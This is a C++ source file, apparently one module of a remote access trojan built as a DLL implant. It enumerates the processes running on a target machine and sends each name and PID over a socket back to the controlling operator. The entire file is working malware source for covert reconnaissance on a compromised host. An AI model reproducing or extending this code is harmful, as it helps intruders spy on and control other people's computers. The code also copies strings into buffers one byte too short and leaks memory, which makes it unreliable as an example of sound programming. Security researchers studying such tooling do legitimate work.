// Patrick Sacchet (@pjsacchet)
// Verison 1.0.
// RAT-Dll-Process.cpp : Defines functionality for performing a process on target, i.e., capture information about a current running process or list all processes running

#include "RAT-Dll-Process.h"
#include "RAT-Dll-Connect.h"
#include <psapi.h>


/** Handle socket work and function calls for performing process listing functionality
* clientSock - current open client socket to implant
return:
* if successful we return SUCCESS; otherwise print error code and handle appropiately
*/
INT handleProcessList(SOCKET clientSock)
{
	 INT status = SUCCESS, numProcesses = 0;
	 CHAR msgBuf[DEFAULT_BUF_LEN];
	 char** processNames = NULL;
	 DWORD* processPIDs = NULL;

	 // Grab a list of process names and their PIDs
	 status = doProcessList(&processNames, &processPIDs, &numProcesses);
	 if (status != SUCCESS)
	 {
		 sprintf_s(msgBuf, "RAT-Dll-Process::handleProcessList - Failure received from handleScreenshot %d\n", status);
		 OutputDebugStringA(msgBuf);
		 goto cleanup;
	 }

	 sprintf_s(msgBuf, "RAT-Dll-Process::handleProcessList - Sending %d processes\n", numProcesses);
	 OutputDebugStringA(msgBuf);
	  
	 // Send back the number of processes we found first 
	 status = send(clientSock, (const char*)&numProcesses, sizeof(INT), 0);
	 if (status == SOCKET_ERROR)
	 {
		 sprintf_s(msgBuf, "RAT-Dll-Process::handleProcessList - Failure recevied from send (num of processes) %d\n", WSAGetLastError());
		 OutputDebugStringA(msgBuf);
		 status = WSAGetLastError();
		 goto cleanup;
	 }

	 status = sendProcesses(clientSock, processNames, processPIDs, numProcesses);
	 if (status != SUCCESS)
	 {
		 sprintf_s(msgBuf, "RAT-Dll-Process::handleProcessList - Failure recevied from sendProcesses %d\n", status);
		 OutputDebugStringA(msgBuf);
		 goto cleanup;
	 }

	 OutputDebugStringA("RAT-Dll-Process::handleProcessList - Successfully sent all processes !\n");

	 // Send success reponse code 
	 status = sendSuccess(clientSock);
	 if (status != SUCCESS)
	 {
		 sprintf_s(msgBuf, "RAT-Dll-Process::handleProcessList - Failure recevied from sendSuccess %d\n", WSAGetLastError());
		 OutputDebugStringA(msgBuf);
		 goto cleanup;
	 }

	 status = SUCCESS;


 cleanup:
	 // TODO: clean memory pls
	return status;
}


INT doProcessList(__inout char*** processNames, __inout DWORD** processPIDs, __inout INT* numProcesses)
{
	INT status = SUCCESS;
	DWORD aProcesses [1024], cbNeeded = 0, cProcesses = 0;
	CHAR msgBuf[DEFAULT_BUF_LEN];
	char szProcessName[MAX_PATH];
	UINT64 i, index = 0;
	char** processNamesOut = NULL;
	DWORD* processPIDsOut = NULL;

	// Return value should be non-zero
	if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded))
	{
		sprintf_s(msgBuf, "RAT-Dll-Process::doProcessList - Failure received from EnumProcesses %d\n", GetLastError());
		OutputDebugStringA(msgBuf);
		status = FAILURE;
		goto cleanup;
	}

	// TODO: Could call EnumProcessModulesEx for module information...
	cProcesses = cbNeeded / sizeof(DWORD);

	sprintf_s(msgBuf, "RAT-Dll-Process::doProcessList - Found %d processes\n", cProcesses);
	OutputDebugStringA(msgBuf);

	// Get each process name and ID
	processNamesOut = (char**)malloc(cProcesses * sizeof(char*));
	if (processNamesOut == NULL)
	{
		OutputDebugStringA("RAT-Dll-Process::doProcessList - Failed to allocate enough memory!\n");
		status = FAILURE;
		goto cleanup;
	}

	processPIDsOut = (DWORD*)malloc(cProcesses * sizeof(DWORD));
	if (processPIDsOut == NULL)
	{
		OutputDebugStringA("RAT-Dll-Process::doProcessList - Failed to allocate enough memory!\n");
		status = FAILURE;
		goto cleanup;
	}

	for (i = 0; i < cProcesses; i++)
	{
		// We're skipping indexes thats why 
		if (aProcesses[i] != 0)
		{
			HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, aProcesses[i]);

			if (hProcess != NULL)
			{
				HMODULE hMod;
				DWORD cbNeeded;

				// Get process name
				if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded))
				{
					GetModuleBaseNameA(hProcess, hMod, szProcessName, sizeof(szProcessName)/sizeof(CHAR));

					// Copy over this base name
					//processNamesOut[i] = (CHAR*)malloc(sizeof(char) * sizeof(szProcessName) / sizeof(CHAR));
					processNamesOut[index] = (char*)malloc(sizeof(char) * strlen((char*)szProcessName));
					if (processNamesOut[index] == NULL)
					{
						OutputDebugStringA("RAT-Dll-Process::doProcessList - Failed to allocate enough memory!\n");
						status = FAILURE;
						goto cleanup;
					}

					strcpy(processNamesOut[index], (char*)szProcessName);

					processPIDsOut[index] = aProcesses[i];

					sprintf_s(msgBuf, "RAT-Dll-Process::doProcessList - Process %s PID %i\n", processNamesOut[index], processPIDsOut[index]);
					OutputDebugStringA(msgBuf);
				}

				CloseHandle(hProcess);

				// This was the bug; we don't always find a process, so we were copying over our strings at random points in the array
					// Use this counter to ensure we properly increment and store values in our arrays
				index++;
			}

			sprintf_s(msgBuf, "RAT-Dll-Process::doProcessList - Process handle was null at index %d\n", i);
			OutputDebugStringA(msgBuf);
		}

		else
		{
			sprintf_s(msgBuf, "RAT-Dll-Process::doProcessList - PID 0 at index %d\n", i);
			OutputDebugStringA(msgBuf);
		}
	}

	*processNames = processNamesOut;
	*processPIDs = processPIDsOut;
	// Technically, we found more processes than this, but these are processes we have information for 
	*numProcesses = index;


cleanup: 
	return status;
}

INT sendProcesses(SOCKET clientSock, char** processNames, DWORD* processPIDs, INT numProcesses)
{
	INT status = SUCCESS;
	CHAR msgBuf[DEFAULT_BUF_LEN];
	char* process = NULL;
	DWORD pid = 0;

	for (int i = 0; i < numProcesses; i++)
	{
		process = processNames[i];
		pid = processPIDs[i];

		sprintf_s(msgBuf, "RAT-Dll-Process::sendProcesses - Sending process %s\n", process);
		OutputDebugStringA(msgBuf);

		status = send(clientSock, process, strlen(process), 0);
		if (status == SOCKET_ERROR)
		{
			sprintf_s(msgBuf, "RAT-Dll-Process::sendProcesses - Failure recevied from send (process name %s) %d\n", process, WSAGetLastError());
			OutputDebugStringA(msgBuf);
			status = WSAGetLastError();
			goto cleanup;
		}

		sprintf_s(msgBuf, "RAT-Dll-Process::sendProcesses - Sending PID %d\n", pid);
		OutputDebugStringA(msgBuf);

		status = send(clientSock, (const char*)&pid, sizeof(pid), 0);
		if (status == SOCKET_ERROR)
		{
			sprintf_s(msgBuf, "RAT-Dll-Process::sendProcesses - Failure recevied from send (process pid number %d) %d\n", pid, WSAGetLastError());
			OutputDebugStringA(msgBuf);
			status = WSAGetLastError();
			goto cleanup;
		}
	}

	status = SUCCESS;


cleanup:
	return status;
}